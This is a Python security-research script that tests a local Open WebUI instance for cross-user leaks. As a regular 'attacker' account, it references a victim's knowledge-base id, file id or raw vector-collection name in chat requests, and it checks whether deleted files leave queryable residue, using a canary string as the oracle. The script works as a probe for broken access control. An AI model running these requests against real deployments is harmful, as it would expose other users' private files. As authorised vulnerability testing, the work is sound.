"""Derived-state (D1/D2) probing for Open WebUI, via the canary-echo oracle.

Beyond CVE-2026-45402 (a route-level D5), we ask whether a regular user can reach
another user's content through the DERIVED layer (per-file vector collections),
and whether deleting a file purges that derived data.

Probes (attacker A is a regular, non-admin user; victim B owns the data):
  D1a  A references B's knowledge id   in chat files:[{type:collection,id:<kbB>}]
  D1b  A references B's file id        in chat files:[{type:file,id:<fidB>}]
  D1c  A supplies B's raw collection   in chat files:[{collection_name:"file-<fidB>"}]
  D2   B deletes its file; is the derived vector collection still queryable afterwards?

Oracle: B's canary appearing in A's (or post-delete B's) echo-LLM prompt = leak.
Local instance only; reads via normal chat API.
"""

import importlib.metadata as md
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from owui_client import OWUIClient  # noqa: E402

PW = "Passw0rd!123"
ECHO_LOG = "/tmp/claude-0/echo_prompts.jsonl"


def read_since(t):
    p = Path(ECHO_LOG)
    if not p.exists():
        return []
    return [json.loads(l) for l in p.read_text(encoding="utf-8").splitlines()
            if l.strip() and json.loads(l).get("ts", 0) >= t]


def canary_in_prompts(mark, since):
    return any(mark in (p.get("prompt") or "") for p in read_since(since))


def ask_raw(client, question, files):
    body = {"model": "echo-chat", "messages": [{"role": "user", "content": question}],
            "stream": False, "files": files}
    return client.s.post(f"{client.base}/api/chat/completions", json=body, timeout=60)


def main():
    base = sys.argv[1]
    out_path = sys.argv[2]
    try:
        version = md.version("open-webui")
    except Exception:
        import os as _os
        version = _os.environ.get("OWUI_VERSION", "docker")
    root = OWUIClient(base).signup("Root Admin", "root@test.local", PW)
    for n, e in [("Attacker A", "atk@test.local"), ("Victim B", "vic@test.local")]:
        try:
            root.admin_add_user(n, e, PW, role="user")
        except Exception:
            pass
    A = OWUIClient(base).signin("atk@test.local", PW)
    B = OWUIClient(base).signin("vic@test.local", PW)

    MARK = "DERIVEDZEBRA42"
    note = (f"Private notes. The confidential marker is {MARK}. "
            f"Mitochondria are the powerhouse of the cell. {MARK} recurs. " * 5)
    fid = B.upload_text("b_private.txt", note)
    B.wait_processed(fid)
    kb = B.create_kb("B KB")
    B.add_file_to_kb(kb, fid)
    coll = f"file-{fid}"

    res = {"app": "open-webui", "version": version, "victim_file": fid, "victim_kb": kb, "probes": {}}

    def run(name, client, files, mark=MARK):
        t = time.time()
        r = ask_raw(client, f"What is the confidential marker? ({mark[:6]})", files)
        try:
            ans = r.json()["choices"][0]["message"]["content"]
        except Exception:
            ans = r.text
        leak_prompt = canary_in_prompts(mark, t)
        leak_ans = mark in (ans or "")
        res["probes"][name] = {"status": r.status_code, "leak_O_prompt": leak_prompt,
                               "leak_O_out": leak_ans, "answer_excerpt": (ans or "")[:120],
                               "LEAK": leak_prompt or leak_ans}
        return res["probes"][name]["LEAK"]

    # D1a/b/c: attacker A references victim B's derived resources
    run("D1a_collection_by_kb_id", A, [{"type": "collection", "id": kb}])
    run("D1b_file_by_id", A, [{"type": "file", "id": fid}])
    run("D1c_raw_collection_name", A, [{"type": "collection", "collection_name": coll}])

    # D2: B deletes its file; does the derived collection remain queryable?
    del_status = B.delete_file(fid)
    res["delete_status"] = del_status
    time.sleep(1)
    # B itself re-queries after delete (does residue remain?)
    run("D2_residue_after_delete_via_rawcollection", B, [{"type": "collection", "collection_name": coll}])
    # and A tries the orphaned collection
    run("D2_residue_attacker_rawcollection", A, [{"type": "collection", "collection_name": coll}])

    leaks = {k: v for k, v in res["probes"].items() if v["LEAK"]}
    res["summary"] = {"any_derived_leak": bool(leaks), "leaking_probes": sorted(leaks)}
    Path(out_path).write_text(json.dumps(res, indent=2), encoding="utf-8")
    print(json.dumps({"version": version, **res["summary"],
                      "probe_verdicts": {k: v["LEAK"] for k, v in res["probes"].items()}}, indent=2))


if __name__ == "__main__":
    main()
